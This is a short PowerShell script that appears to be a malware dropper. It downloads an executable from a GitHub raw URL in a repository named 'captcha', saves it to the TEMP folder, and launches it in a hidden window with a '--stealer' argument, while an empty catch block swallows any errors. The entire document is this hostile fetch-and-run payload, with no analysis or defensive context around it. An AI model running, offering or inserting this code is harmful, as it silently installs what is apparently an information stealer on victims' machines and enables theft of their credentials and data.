$exePath = "$env:TEMP\Omena.exe"
$url = "https://raw.githubusercontent.com/urho122-cpu/captcha/refs/heads/main/Omena.exe"

try {
    (New-Object Net.WebClient).DownloadFile($url, $exePath)
    Start-Process $exePath -ArgumentList '--stealer' -WindowStyle Hidden
} catch {
    # Nothing
}
